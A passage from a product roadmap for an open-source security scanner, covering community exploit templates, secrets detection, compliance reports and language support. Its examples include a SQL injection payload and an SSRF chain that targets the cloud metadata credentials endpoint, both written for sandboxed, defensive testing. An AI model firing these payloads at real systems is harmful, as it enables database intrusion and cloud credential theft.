  - Comparison table: Armur vs Semgrep vs SonarQube vs Snyk (open source features)
  - Live demo: paste a code snippet, get instant findings (powered by `armur_scan_code` MCP tool / Cloud API)
  - Testimonials from real users / contributor quotes
  - "Get started" CTA: `brew install armur-ai/tap/armur`
- [ ] Pricing page at `armur.ai/pricing` (maps to Sprint 30.5 tiers)
- [ ] Blog at `armur.ai/blog` — technical content driving SEO

#### 31.2 Documentation Site

- [ ] Deploy docs at `docs.armur.ai` (using Docusaurus or Nextra — React-based, great SEO)
- [ ] Sections:
  - **Getting Started** (5-minute quickstart — must work end-to-end in one terminal session)
  - **CLI Reference** (every command, every flag, every config option)
  - **Tool Reference** (what each of the 18+ tools does, what it detects, version requirements)
  - **Language Support** (per-language tool coverage matrix)
  - **IaC Support** (per-IaC platform coverage matrix)
  - **Configuration** (`.armur.yml` full reference)
  - **CI/CD Integrations** (GitHub Actions, GitLab, CircleCI, Jenkins, etc.)
  - **MCP Integration** (Claude Code, Cursor, Windsurf, Claude Desktop)
  - **API Reference** (OpenAPI spec rendered with Scalar or Redoc)
  - **Rules Marketplace** (how to install, create, and share rules)
  - **Contributing** (how to add a new tool, new language, new compliance rule)
- [ ] Search: Algolia DocSearch (free for open source)
- [ ] Versioned docs: separate docs for each major CLI version

#### 31.3 Demo Content

- [ ] **asciinema demo**: record a 90-second terminal demo of `armur run .` on a real vulnerable repo — embed on landing page and README
- [ ] **YouTube channel**: `youtube.com/@armur-ai`
  - Video 1: "Find security vulnerabilities in your code in 30 seconds" (5 min quickstart)
  - Video 2: "Armur + Claude Code: AI-powered security scanning" (MCP integration demo)
  - Video 3: "How to add Armur to your GitHub Actions CI pipeline" (3 min tutorial)
  - Video 4: "Scanning a vulnerable Node.js app with Armur" (real-world demo)
- [ ] **Dev.to & Hashnode**: write introductory articles with embedded demos; cross-post
- [ ] **Product Hunt launch**: submit when v1.0.0 ships; prepare launch assets (logo, screenshots, tagline)

#### 31.4 Discord Community

- [ ] Create Armur Discord server at `discord.gg/armur`
- [ ] Channels: `#announcements`, `#help`, `#showcase` (share your scan results), `#rules-marketplace`, `#contributors`, `#general`
- [ ] Discord bot (`@Armur Bot`): `/scan <github-url>` triggers a scan from within Discord; posts results in thread
- [ ] Weekly "Security of the Week" post: scan a popular open source repo, share interesting findings in `#showcase`
- [ ] Contributor office hours: weekly 30-minute voice call for contributors to ask questions

#### 31.5 Contributor Program

- [ ] `CONTRIBUTING.md` with a step-by-step guide: add a new tool, add a new language, add a compliance rule
- [ ] "Good First Issues" tagged in GitHub Issues for newcomers
- [ ] **Bounty program**: defined bounties for specific contributions:
  - New tool integration (complete with tests + testdata): $50–200 depending on complexity
  - New language support (full suite): $200–500
  - New compliance framework mapping: $100–300
  - Bug with reproduction case + fix: $25–100
- [ ] **Security Hall of Fame**: contributors who report vulnerabilities in Armur itself
- [ ] Contributor recognition: GitHub Sponsors profile, contributor badge in Discord, mention in release notes
- [ ] `SECURITY.md` with responsible disclosure policy and contact email

#### 31.6 "Scan Open Source" Program

- [ ] `armur.ai/open-source` — program that scans popular open source projects monthly and publishes results publicly (with maintainer notification)
- [ ] Reports published as blog posts: "Security analysis of the top 100 Go projects"
- [ ] Responsible disclosure: findings shared privately with maintainers 30 days before publishing
- [ ] This generates high-quality SEO content, press coverage, and demonstrates Armur's capabilities at scale
- [ ] Partner with CNCF, Apache Foundation, and similar orgs for responsible scanning of their projects

### Sprint 32 — Community Ecosystem [DONE] & Network Effects

This is the growth engine. Like Nuclei's 9,000+ templates, Armur's value should compound with
every community contribution. Every contributor becomes an evangelist. Every shared template
makes the tool more valuable for everyone. This sprint builds the infrastructure for that flywheel.

#### 32.1 Template Registry Infrastructure

- [ ] Create `github.com/armur-ai/armur-templates` mono-repo — the community template hub
- [ ] Directory structure:
  ```
  armur-templates/
  ├── rules/              # Security rule packs (Semgrep YAML)
  │   ├── go-security/
  │   ├── python-owasp/
  │   └── jwt-misconfig/
  ├── exploits/           # Exploit PoC templates (for DAST sandbox)
  │   ├── sqli/
  │   ├── xss/
  │   └── ssrf/
  ├── sandboxes/          # Sandbox profiles (Dockerfile + compose templates)
  │   ├── django/
  │   ├── express/
  │   ├── spring-boot/
  │   └── rails/
  ├── fixes/              # Auto-fix recipes (pattern → patch)
  │   ├── go/
  │   ├── python/
  │   └── javascript/
  ├── chains/             # Attack chain definitions
  │   ├── sqli-to-rce.yaml
  │   └── ssrf-to-cloud-keys.yaml
  └── index.json          # Machine-readable template index
  ```
- [ ] `index.json` schema: `{ "templates": [{ "name": "go-security", "type": "rules", "version": "1.2.0", "count": 24, "languages": ["go"], "author": "...", "downloads": 0 }] }`
- [ ] Automated CI on the templates repo: validate YAML schema, run tests, update index.json on merge
- [ ] PR-based contribution workflow with CODEOWNERS review for each template category
- [ ] Template versioning: semver per template pack, `armur templates update` fetches latest

#### 32.2 Exploit Templates (The Nuclei Parallel)

This is where Armur builds the deepest moat. Community-contributed exploit PoCs that run safely
in sandboxes. The more templates, the more vulnerabilities Armur can confirm.

- [ ] Exploit template format (YAML, inspired by Nuclei):
  ```yaml
  id: sqli-union-based
  name: SQL Injection — Union-Based Extraction
  severity: critical
  type: http
  tags: [sqli, owasp-a03, cwe-89]
  author: "@contributor"

  requests:
    - method: GET
      path: "{{target}}{{path}}?{{param}}=1' UNION SELECT 1,2,3--"
      matchers:
        - type: regex
          part: body
          regex: ["(error in your SQL|mysql_fetch|pg_query|sqlite3)"]
      extractors:
        - type: regex
          name: db_error
          regex: ["(MySQL|PostgreSQL|SQLite|ORA-\\d+)"]

  evidence:
    description: "SQL injection confirmed via error-based detection"
    impact: "Full database read access"
    remediation: "Use parameterized queries"
  ```
- [ ] Template runner in `internal/exploit/template_runner.go`:
  - Parse YAML template
  - Execute HTTP requests against sandbox URL
  - Apply matchers and extractors
  - Generate `ExploitResult` with evidence
- [ ] `armur templates search sqli` — search exploit templates by tag, CWE, or keyword
- [ ] `armur templates run sqli-union-based --url <sandbox-url>` — run a specific exploit template
- [ ] Template authors get credit: "Found by exploit template `sqli-union-based` by @contributor"
- [ ] Track template effectiveness: how often each template confirms a finding (used to rank templates)

#### 32.3 Sandbox Profiles

Community-contributed "how to build and run this framework in a sandbox" profiles.

- [ ] Sandbox profile format:
  ```yaml
  id: django-app
  name: Django Application
  framework: django
  language: python
  author: "@contributor"

  detection:
    files: ["manage.py", "settings.py", "wsgi.py"]
    patterns: ["django"]

  build:
    dockerfile: |
      FROM python:3.12-slim
      WORKDIR /app
      COPY requirements.txt .
      RUN pip install -r requirements.txt
      COPY . .
    env:
      - DJANGO_SETTINGS_MODULE=myapp.settings
      - DATABASE_URL=sqlite:///tmp/test.db
      - SECRET_KEY=armur-test-secret

  run:
    command: "python manage.py runserver 0.0.0.0:8000"
    port: 8000
    health_check: "/admin/login/"
    startup_timeout: 30
  ```
- [ ] `armur templates install django-app` — install a sandbox profile locally
- [ ] Sandbox engine (Sprint 17) auto-selects the matching profile based on detection rules
- [ ] Community can contribute profiles for any framework: Next.js, FastAPI, Spring Boot, Rails, Laravel, Gin, etc.
- [ ] The more profiles, the more projects Armur can auto-sandbox and DAST-test

#### 32.4 Fix Recipes

Community-contributed auto-fix patterns: "for this vulnerability pattern, apply this code transformation."

- [ ] Fix recipe format:
  ```yaml
  id: go-sql-injection-fix
  name: Parameterize SQL Query (Go)
  language: go
  cwe: CWE-89
  author: "@contributor"

  pattern: |
    db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", $VAR))

  fix: |
    db.Query("SELECT * FROM users WHERE id = $1", $VAR)

  test:
    vulnerable: |
      db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", userID))
    fixed: |
      db.Query("SELECT * FROM users WHERE id = $1", userID)
  ```
- [ ] `armur fix --recipe go-sql-injection-fix <finding-id>` — apply a specific fix recipe
- [ ] `armur fix --auto` — automatically find and apply matching recipes for all findings
- [ ] Fix recipes complement the AI-generated fixes (Sprint 16) with deterministic, tested patterns
- [ ] Track recipe success rate: how often each recipe successfully fixes the finding

#### 32.5 Attack Chain Definitions

Community-contributed vulnerability chaining rules for attack path analysis (Sprint 19).

- [ ] Chain definition format:
  ```yaml
  id: ssrf-to-cloud-credential-theft
  name: SSRF → Cloud Metadata → Credential Theft
  severity: critical
  author: "@contributor"

  chain:
    - finding_type: ssrf
      description: "SSRF allows internal HTTP requests"
    - action: "Request cloud metadata endpoint"
      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    - outcome: "AWS IAM credentials exposed"
      impact: "Full AWS account access"

  detection:
    requires:
      - cwe: CWE-918  # SSRF
    context:
      - cloud_provider: aws  # OR gcp, azure
  ```
- [ ] Chain definitions loaded during attack path analysis (Sprint 19)
- [ ] The more chains the community defines, the more attack paths Armur discovers

#### 32.6 `armur templates` CLI

- [ ] `armur templates list` — browse all available templates across all categories (rules, exploits, sandboxes, fixes, chains)
- [ ] `armur templates search <query>` — search by keyword, CWE, language, category, or author
- [ ] `armur templates install <name>` — download and install a template pack to `~/.armur/templates/`
- [ ] `armur templates update` — update all installed templates to latest versions
- [ ] `armur templates create` — interactive wizard to scaffold a new template (picks category, generates YAML skeleton)
- [ ] `armur templates test <file>` — validate and test a template locally before contributing
- [ ] `armur templates publish <file>` — submit a template as a PR to `armur-ai/armur-templates` (requires GitHub auth)
- [ ] `.armur.yml` integration:
  ```yaml
  templates:
    rules:
      - go-security@1.2.0
      - python-owasp@2.0.1
    exploits:
      - sqli-advanced@1.0.0
    sandboxes:
      - django-app@1.0.0
    local:
      - ./my-custom-templates/
  ```

#### 32.7 Contributor Metrics & Recognition

- [ ] Public contributor leaderboard at `armur.ai/contributors`:
  - Top contributors by: templates submitted, downloads generated, findings confirmed
  - "Template of the Month" featured on the homepage
- [ ] Template download counts visible on each template's page (like npm package pages)
- [ ] Author attribution in every finding: "Detected by rule `go-sql-injection` by @contributor"
- [ ] GitHub profile badge: "Armur Template Author" for anyone with an accepted template
- [ ] Template stats in `armur templates list`: name, downloads, confirmed findings, last updated
- [ ] "Powered by N community templates" counter displayed in the TUI scan dashboard

---

## Phase 5: Scanner Breadth (v3.0) — Sprints 33–44

*Note: Sprint numbers in Phase 5–7 shifted by +1 due to the addition of Sprint 32 (Community Ecosystem).*

Deep coverage across secrets, taint tracking, API security, compliance, SBOM, supply chain, language tiers, IaC deep, and container image security.
These sprints make Armur the most comprehensive open-source scanner available.

---

### Sprint 32 — Secrets Detection: Comprehensive & Deep

The current trufflehog3 integration scans only the working tree. This sprint makes secrets detection
deep, validated, and actionable.

#### 32.1 Git History Scanning

- [x] **Gitleaks** integration (fast, accurate secrets scanner with excellent rule coverage)
  - Run: `gitleaks detect --source <dir> --report-format json --report-path results.json`
  - For git history mode: `gitleaks detect --source <dir> --log-opts="--all" --report-format json`
  - Parse `findings`; map `RuleID`, `Description`, `Secret`, `Commit`, `Author`, `Date`, `File`, `Line` to `Finding`
  - Gitleaks rules cover 150+ secret types including: AWS, GCP, Azure, GitHub, Stripe, Slack, Twilio, etc.
- [x] **Trufflehog v3** upgrade: switch from `trufflehog3` to the newer `trufflehog` CLI (v3.x):
  - Run: `trufflehog filesystem --json --no-verification <dir>`
  - For git history: `trufflehog git file://<dir> --json --since-commit HEAD~100`
- [x] Add `--scan-history` flag to `armur run` and API: when true, scan full git history (slow but thorough)
- [x] When history scanning: deduplicate secrets found in both current tree and history; annotate with earliest commit date

#### 32.2 Secret Validation

- [x] For detected secrets, optionally validate if they are still active (opt-in via `.armur.yml: secrets.validate: true`):
  - **AWS Access Keys**: call `sts:GetCallerIdentity` — if 200: mark as ACTIVE (critical), if 403: mark as INVALID
  - **GitHub Personal Access Tokens**: call `GET /user` — if 200: mark as ACTIVE
  - **Stripe API Keys**: call `GET /v1/charges?limit=1` — if 200: mark as ACTIVE
  - **Slack Bot Tokens**: call `auth.test` — if `ok: true`: mark as ACTIVE
  - **Generic JWT**: decode and check expiry claim without signature verification
- [x] Add `Finding.SecretStatus` field: `"active"` | `"expired"` | `"invalid"` | `"unvalidated"`
- [x] Mark validated active secrets as `SeverityCritical`; unvalidated secrets as `SeverityHigh`

#### 32.3 Git Blame Integration

- [x] For each detected secret: run `git blame -L <line>,<line> <file>` to get commit hash, author, date
- [x] Populate `Finding.BlameCommit`, `Finding.BlameAuthor`, `Finding.BlameDate` fields
- [x] Display in CLI: "Introduced by: jane@example.com in commit abc1234 on 2025-01-15"
- [x] Include git blame data in HTML reports for accountability tracking

#### 32.4 Custom Secret Patterns & Allowlists

- [x] `.armur.yml` secrets configuration:
  ```yaml
  secrets:
    validate: false           # set true to test if found secrets are still active
    scan-history: false       # set true to scan full git history
    custom-patterns:
      - name: "Internal API Key"
        regex: "INTERNAL_[A-Z0-9]{32}"
        severity: critical
    allowlist:
      - path: "testdata/**"   # ignore secrets in test fixtures
      - regex: "example_key_.*"  # ignore obviously fake keys
      - commit: "abc1234"     # ignore a specific commit (already rotated)
  ```
- [x] Load and apply custom patterns during gitleaks/trufflehog execution (via gitleaks custom config)
- [x] Allowlist entries suppress findings without removing them from the raw count (audit trail preserved)

#### 32.5 Entropy-Based Detection

- [x] Implement high-entropy string detection as a standalone pass (complement to rule-based detection):
  - Scan all string literals in source code
  - Compute Shannon entropy; flag strings with entropy > 4.5 and length > 20 as potential secrets
  - Apply a dictionary filter (skip strings that are mostly English words)
- [x] Rate-limit entropy findings: max 50 per file to avoid alert fatigue
- [x] Present entropy findings with lower confidence: `Finding.Confidence = "low"`

---

### Sprint 33 — Advanced Static Analysis (Taint Tracking & Data Flow)

Most tools in Armur today are pattern-based. This sprint adds semantic analysis that tracks data
across call boundaries — the class of analysis that CodeQL and Semgrep Pro are known for.

#### 33.1 Semgrep Pro Taint Mode Integration

- [x] Upgrade semgrep invocation to use `--config=p/default` and explicitly add taint rules:
  - `--config=p/sql-injection` (taint: user input → SQL query builder)
  - `--config=p/xss` (taint: user input → HTML output)
  - `--config=p/command-injection` (taint: user input → os.exec / subprocess)
  - `--config=p/path-traversal` (taint: user input → file path operations)
  - `--config=p/ssrf` (taint: user input → HTTP client URL)
- [x] Enable `interfile: true` in semgrep config to get cross-file taint analysis
- [x] Parse `taint_trace` field from semgrep JSON output when present; add to `Finding.TaintTrace []TraceStep`
- [x] Display taint trace in the TUI detail view and HTML report: "Source → [3 intermediate steps] → Sink"

#### 33.2 Go Race Condition Detection

- [x] Integrate `go test -race ./...` as an optional scan step (requires test suite present):
  - Run with `-count=1 -timeout 120s`; parse race detector output
  - Map each detected race to a `race_condition` finding category with CRITICAL severity
- [x] Integrate `golangci-lint` with `govet` (includes `-copylocks`, `-loopclosure` analyzers)
- [x] **Go deadcode** integration: extend `godeadcode` to flag unreachable exported functions separately

#### 33.3 Integer & Arithmetic Safety

- [x] Semgrep rules for integer overflow patterns:
  - `int(float64)` conversions without bounds checking
  - Unchecked `strconv.Atoi` used in size/offset calculations
  - Loop bounds from user input without validation
- [x] For C/C++: cppcheck `--enable=warning` covers integer overflows
- [x] For Rust: clippy `clippy::arithmetic-side-effects` lint integration

#### 33.4 Type Confusion & Unsafe Deserialization

- [x] Semgrep rules for unsafe deserialization:
  - Python: `pickle.loads(user_input)`, `yaml.load()` without Loader
  - Java: `ObjectInputStream` from user-controlled streams
  - PHP: `unserialize($user_input)`
  - JavaScript: `eval(userInput)`, `Function(userInput)()`
- [x] Bandit rules B301-B302 (pickle, yaml.load) already partially covered; ensure they are emitted

---

### Sprint 34 — API Security [DONE] Analysis

#### 34.1 OpenAPI / Swagger Spec Security Analysis

- [x] Detect OpenAPI specs: `openapi.yaml`, `openapi.json`, `swagger.yaml`, `swagger.json`, `api-docs.json`
- [x] Implement `internal/tools/openapi.go` — parse spec and run security checks:
  - [x] Missing `security` on individual operations (endpoint has no auth requirement defined)
  - [x] Missing global `securitySchemes` definition
  - [x] HTTP scheme used instead of HTTPS in `servers[].url`
  - [x] Parameters with `in: query` or `in: header` missing `maxLength` or `pattern` (injection risk)
  - [x] Response schemas missing for 4xx/5xx codes (information disclosure risk)
  - [x] `additionalProperties: true` on request body schemas (mass assignment risk)
  - [x] Deprecated API versions still listed without deprecation notice header
- [x] Use `go-openapi/loads` library to parse spec; implement checks as functions

#### 34.2 GraphQL Schema Security Analysis

- [x] Detect GraphQL schemas: `schema.graphql`, `*.graphql`, `schema.gql`
- [x] Implement `internal/tools/graphql.go` — parse schema and run security checks:
  - [x] Introspection type `__schema` present (should be disabled in production)
  - [x] Missing depth limit annotation or directive (`@complexity`, `@depth`)
  - [x] Mutation fields without auth directives (unauthenticated data modification)
  - [x] Subscription fields (potential DoS via long-lived connections)
  - [x] Batch query support without rate limiting (N+1 / DoS risk)
- [x] Use `github.com/vektah/gqlparser/v2` to parse GraphQL schema

#### 34.3 JWT Implementation Analysis

- [x] Detect JWT usage patterns across all supported languages:
  - Go: `github.com/golang-jwt/jwt`, `github.com/dgrijalva/jwt-go`
  - Python: `PyJWT`, `python-jose`
  - JavaScript: `jsonwebtoken`, `jose`
- [x] Check for insecure patterns:
  - `alg: "none"` acceptance (algorithm confusion attack)
  - HMAC secret derived from public key or short constant
  - Missing `exp` (expiry) claim verification
  - Missing `aud` (audience) claim verification
  - `RS256` keys with bit length < 2048
- [x] Implement as a semgrep rule pack in `configs/semgrep/jwt-security.yaml`

#### 34.4 OAuth 2.0 & OIDC Misconfiguration

- [x] Detect OAuth client implementations and check for:
  - Missing PKCE (`code_challenge` parameter) in public clients
  - `response_type=token` (implicit flow — deprecated and insecure)
  - Redirect URI wildcard (`*`) or insufficient validation
  - Client secret committed to source code (detected by secrets scanner, but add specific OAuth context)
- [x] Add OIDC-specific checks: missing `nonce` validation, ID token not verified

---

### Sprint 35 — Compliance [DONE] Framework Mapping

Map every finding to every relevant compliance control so security teams can generate compliance evidence
directly from scan results.

#### 35.1 OWASP Top 10 (2021)

- [x] Build complete OWASP Top 10 2021 mapping table in `internal/compliance/owasp_top10.go`:
  - A01 Broken Access Control → findings from: semgrep auth rules, gosec G401+, checkov IAM rules
  - A02 Cryptographic Failures → findings from: gosec G401/G402/G501, semgrep crypto, bandit B323
  - A03 Injection → findings from: gosec G201, bandit B608, semgrep sql/injection, semgrep commandinjection
  - A04 Insecure Design → findings from: architecture-level checkov rules, missing security headers
  - A05 Security Misconfiguration → findings from: checkov, tfsec, hadolint, kube-linter
  - A06 Vulnerable Components → all SCA findings (trivy, osv-scanner, cargo-audit, etc.)
  - A07 Auth & Session Mgmt → findings from: gosec G101, semgrep session rules, jwt analysis
  - A08 Software & Data Integrity → supply chain findings (Sprint 33), SBOM gap findings
  - A09 Logging & Monitoring Failures → findings from: semgrep logging rules, missing audit log patterns
  - A10 SSRF → findings from: semgrep ssrf rules, bandit B310
- [x] Add `Finding.OWASP2021` field (e.g., `"A03:2021"`)
- [x] `armur report owasp --task <id>` — generate OWASP Top 10 compliance report showing coverage per category

#### 35.2 CWE Top 25 (2024)

- [x] Build CWE Top 25 2024 mapping in `internal/compliance/cwe_top25.go`
- [x] Map all tool rule IDs to CWE IDs (most tools already emit CWEs — collect and normalize)
- [x] `armur report cwe --task <id>` — print CWE Top 25 coverage matrix

#### 35.3 PCI-DSS v4.0

- [x] Build PCI-DSS requirement → finding category mapping:
  - Req 6.2 (bespoke software security): all SAST findings
  - Req 6.3 (security vulnerabilities identified and addressed): all SCA findings
  - Req 6.3.3 (patches applied): outdated dependency SCA findings
  - Req 8.3 (strong authentication): JWT/OAuth misconfiguration findings
  - Req 10 (log and monitor): logging/monitoring gap findings
- [x] `armur report pci --task <id>` — PCI-DSS compliance gap report with remediation guidance

#### 35.4 HIPAA Technical Safeguards

- [x] Map findings to HIPAA §164.312 technical safeguard requirements:
  - §164.312(a)(2)(iv) Encryption and Decryption → crypto findings
  - §164.312(c)(2) Authentication → auth findings
  - §164.312(d) Person or Entity Authentication → JWT/auth misconfiguration
  - §164.312(e)(2)(ii) Encryption in transit → TLS/HTTPS misconfiguration findings
- [x] `armur report hipaa --task <id>` — HIPAA technical safeguard gap report

#### 35.5 NIST SP 800-53 & SOC 2

- [x] Build NIST SP 800-53 Rev 5 control → finding mapping for the most relevant controls (SA-11, SI-3, SC-28, IA-5, etc.)
- [x] Build SOC 2 Trust Service Criteria → finding mapping (CC6.1, CC6.6, CC6.8, CC7.1, CC8.1)
- [x] `armur report nist --task <id>` and `armur report soc2 --task <id>` compliance reports

---

### Sprint 36 — SBOM [DONE] Generation & License Compliance

#### 36.1 SBOM Generation (CycloneDX + SPDX)

- [x] **CycloneDX** SBOM generation for all supported ecosystems:
  - Use `cdxgen` (CycloneDX Generator — supports 20+ ecosystems):
    - Run: `cdxgen -t <type> -o sbom.json <dir>`
  - Output: `~/.armur/sboms/<task-id>.cdx.json`
  - Include all direct + transitive dependencies with PURLs
- [x] **SPDX** SBOM generation:
  - Use `spdx-sbom-generator` or Trivy SPDX mode: `trivy fs --format spdx-json <dir>`
  - Output: `~/.armur/sboms/<task-id>.spdx.json`
- [x] `armur sbom <target> --format cyclonedx|spdx` CLI command
- [x] SBOM content includes: component name, version, PURL, license, supplier, checksum
- [x] NTIA Minimum Elements compliance check: verify SBOM contains all required NTIA fields; report gaps
- [x] **Dependency-Track** export: `armur sbom upload --dt-url <url> --project-id <id>` — push SBOM to a Dependency-Track instance

#### 36.2 License Detection & Compliance

- [x] **licensee** integration (GitHub's license detection tool — identifies SPDX license IDs)
  - Run: `licensee detect <dir> --json`; extract license expressions per file/package
- [x] **FOSSA-style license policy** in `.armur.yml`:
  ```yaml
  licenses:
    allowed:
      - MIT
      - Apache-2.0
      - BSD-2-Clause
      - BSD-3-Clause
      - ISC
    denied:
      - GPL-3.0-only       # copyleft — incompatible with proprietary products
      - AGPL-3.0-only      # network copyleft
      - SSPL-1.0           # server-side copyleft
    notice-required:
      - MPL-2.0            # weak copyleft — require attribution notice
  ```
- [x] Flag each dependency with a denied license as a `license_violation` finding (severity: HIGH for copyleft)
- [x] License compatibility matrix: detect GPL contamination — if any transitive dep is GPL, the entire dependency tree is tainted
- [x] `armur licenses <target>` CLI command: print a table of all dependencies with their detected licenses
- [x] Generate an attribution notice file (`NOTICES.txt`) for all permissive-license dependencies

---

### Sprint 37 — Supply Chain [DONE] Security

#### 37.1 Dependency Confusion Detection

Dependency confusion attacks substitute a private package with a malicious public one by registering
the private package name on the public registry with a higher version number.

- [x] Detect private package name patterns in manifests:
  - Scope packages (`@company/pkg`) in npm that also exist on the public registry
  - Internal PyPI package names that appear on public PyPI with a newer version
  - Go module paths that use internal domains but resolve via public GOPROXY
- [x] For each internal package: check if the same name exists on the public registry (npm API, PyPI API)
- [x] If found with a higher version on public registry: flag as `CRITICAL` dependency confusion risk
- [x] Recommend mitigation: use `--registry` flags, npm `.npmrc` scope-to-registry mappings, or Artifactory

#### 37.2 Typosquatting Detection

- [x] Maintain a list of top-1000 most-downloaded packages per ecosystem (npm, PyPI, RubyGems, crates.io)
- [x] For each dependency in the scanned manifest: compute Levenshtein distance against the top-1000 list
- [x] If distance == 1 and the package is not in the top-1000: flag as potential typosquat (severity: MEDIUM)
- [x] False positive reduction: only flag packages with <1,000 total downloads or <1 year old on the registry

#### 37.3 Dependency Version Pinning Analysis

- [x] Analyze lockfiles and manifests for version constraint security:
  - Flag semver ranges (`^1.0.0`, `~1.0.0`, `>=1.0.0`) as `INFO` — prefer exact pins for reproducibility
  - Flag unpinned indirect dependencies (manifest has `^1.0.0` but no lockfile committed)
  - Flag missing lockfile: manifest has dependencies but no lockfile in the repo
- [x] **Renovate / Dependabot config detection**: check if automated dependency update tooling is configured; if not, flag as `INFO`

#### 37.4 Package Provenance & Signing

- [x] **npm provenance** check: for npm packages, verify `provenance` attestation via npm CLI (`npm audit signatures`)
- [x] **Sigstore/cosign** verification for Go modules: use `cosign verify-blob` for signed modules
- [x] **PyPI Trusted Publishers** check: verify if critical PyPI packages use Trusted Publisher attestations
- [x] Flag packages published from unverified sources as `INFO` findings

#### 37.5 Abandoned & Unmaintained Package Detection

- [x] For each dependency: query the package registry API for:
  - Last release date (flag if > 2 years with no release)
  - Number of maintainers (flag if sole maintainer and account shows no recent activity)
  - Repository archived on GitHub (flag as abandoned)
- [x] Severity mapping: actively abandoned + has known CVEs → HIGH; just abandoned → LOW; sole maintainer → INFO

---

### Sprint 38 — Language Expansion: Tier 1 [DONE] (Java · Kotlin · C# · Rust)

These four languages represent the highest-demand enterprise environments. Each gets SAST, SCA,
and quality analysis coverage using the best-in-class open source tools for that ecosystem.

#### 38.1 Java & Kotlin

- [x] **SpotBugs** integration (static bytecode analysis, 400+ bug patterns)
  - Run: `spotbugs -textui -xml:withMessages -output results.xml <classes-dir>`
  - Parse XML output; map to `Finding.Category` by bug pattern category (SECURITY, CORRECTNESS, etc.)
  - Require a pre-compiled `.class` directory or run Maven/Gradle compile step first
- [x] **PMD** integration (code quality, 300+ rules including security)
  - Run: `pmd check -d <src> -R rulesets/java/quickstart.xml -f json`
  - Parse `violations` array; map `rule` to `RuleID`, `priority` to `Severity`
- [x] **OWASP Dependency-Check** (SCA for Maven/Gradle/Ivy)
  - Run: `dependency-check.sh --scan <dir> --format JSON --out <outdir>`
  - Parse `vulnerabilities` in each `dependency`; map CVE IDs and CVSS scores to `Finding`
- [x] **Error Prone** integration (Google's compile-time bug checker for Java)
  - Invoke via Gradle/Maven plugin; parse annotation-processor diagnostic output
- [x] **semgrep** Java rules — already runs on auto config; add explicit `--config=p/java` and `--config=p/kotlin`
- [x] Language detection: add `.java`, `.kt`, `.kts`, `pom.xml`, `build.gradle`, `build.gradle.kts` to language detector
- [x] Add `testdata/java/` and `testdata/kotlin/` with known-vulnerable sample files
- [x] Document Java/Kotlin support in README with setup instructions (JDK version requirement)

#### 38.2 C# and .NET

- [x] **Security Code Scan** integration (Roslyn-based SAST for C#/VB.NET)
  - Run as a dotnet tool: `dotnet-scs --project <csproj> --export-sarif-file results.sarif`
  - Parse SARIF output using the shared SARIF parser (from Sprint 3.1)
- [x] **Puma Scan** Community Edition integration (OWASP-mapped C# security scanner)
  - Run: `puma-scan -solution <sln> -j results.json`
- [x] **dotnet-retire** integration (detect retired/vulnerable NuGet packages)
  - Run: `retire --js --path <dir> --outputformat json`
  - Map CVE IDs to SCA findings
- [x] **Semgrep** C# rules: add `--config=p/csharp` to the semgrep invocation for .NET repos
- [x] **Roslynator CLI** integration (200+ Roslyn analyzers for code quality)
  - Run: `roslynator analyze <sln> --output results.xml`
- [x] Language detection: add `.cs`, `.vb`, `.csproj`, `.sln`, `*.nuspec`, `packages.config`, `packages.lock.json`
- [x] Add `testdata/csharp/` with known-vulnerable C# sample files
- [x] NuGet SCA: parse `packages.config` and `<PackageReference>` in `.csproj` files; query OSV/NVD for CVEs

#### 38.3 Rust

- [x] **cargo-audit** integration (official Rust advisory database SCA)
  - Run: `cargo audit --json`; parse `vulnerabilities.list` array
  - Map advisory IDs (RUSTSEC-*), CVSS scores, and patched versions to `Finding`
- [x] **cargo-deny** integration (license compliance + SCA + bans for Rust)
  - Run: `cargo deny check --format json`
  - Parse `deny`, `advisories`, `licenses` sections
  - Emit license findings to a new `license_violation` category
- [x] **cargo-geiger** integration (unsafe code detection)
  - Run: `cargo geiger --output-format Json`
  - Map `unsafe` counts per crate to findings with severity proportional to count
- [x] **Clippy** integration (official Rust linter with security-relevant lints)
  - Run: `cargo clippy --message-format json -- -W clippy::all`
  - Parse JSON diagnostic stream; map `lint` names containing "security"/"correctness" to relevant categories
- [x] **Semgrep** Rust rules: add `--config=p/rust` to semgrep invocation for Rust repos
- [x] Language detection: add `.rs`, `Cargo.toml`, `Cargo.lock`
- [x] Add `testdata/rust/` with known-vulnerable Rust sample files (unsafe blocks, outdated deps)

---

### Sprint 39 — Language Expansion: Tier 2 [DONE] (PHP · Ruby · Swift · Shell)

#### 39.1 PHP

- [x] **PHPCS + Security Sniffs** integration
  - Run: `phpcs --standard=Security --report=json <dir>`
  - Parse `files` map; map each `message` to a finding
- [x] **Psalm** integration (static analysis for PHP, security-focused mode)
  - Run: `psalm --output-format=json --taint-analysis <dir>`
  - Parse `issues` array; taint-analysis results map to `security_issues` category
- [x] **PHP Security Checker** (symfony/security-checker or local-php-security-checker)
  - Run: `local-php-security-checker --format=json`
  - Parses `composer.lock`; maps CVE advisories to SCA findings
- [x] **Exakat** integration (PHP static analyzer with security rules)
  - Run: `exakat project -p myproject -r <dir> -format json`
- [x] Language detection: add `.php`, `composer.json`, `composer.lock`
- [x] Add `testdata/php/` with SQL injection, eval injection, file include vulnerability samples

#### 39.2 Ruby

- [x] **Brakeman** integration (Rails security scanner — best-in-class for Ruby web apps)
  - Run: `brakeman -o /dev/stdout -f json <dir>`
  - Parse `warnings` array; map `warning_type` to `RuleID`, `confidence` to `Severity`
  - Map to OWASP categories using Brakeman's built-in OWASP tags
- [x] **bundler-audit** integration (SCA for RubyGems)
  - Run: `bundle-audit check --json`
  - Parse advisory list; map to SCA findings with CVE IDs and patched versions
- [x] **RuboCop** with security rules (`rubocop-rails-security`, `rubocop-ast` security cops)
  - Run: `rubocop --format json --only Security <dir>`
  - Parse `offenses` in each `file`
- [x] Language detection: add `.rb`, `Gemfile`, `Gemfile.lock`, `Rakefile`, `.gemspec`
- [x] Add `testdata/ruby/` with known-vulnerable Rails patterns (mass assignment, CSRF, open redirect)

#### 39.3 Swift

- [x] **SwiftLint** with security rules integration
  - Run: `swiftlint lint --reporter json <dir>`
  - Parse violations; filter for security-relevant rule identifiers
- [x] **Periphery** integration (dead code detection for Swift/Xcode projects)
  - Run: `periphery scan --format json`
  - Map unused declarations to `dead_code` category
- [x] **semgrep** Swift rules: add `--config=p/swift` for Swift repos
- [x] Language detection: add `.swift`, `Package.swift`, `Package.resolved`, `.xcodeproj/`
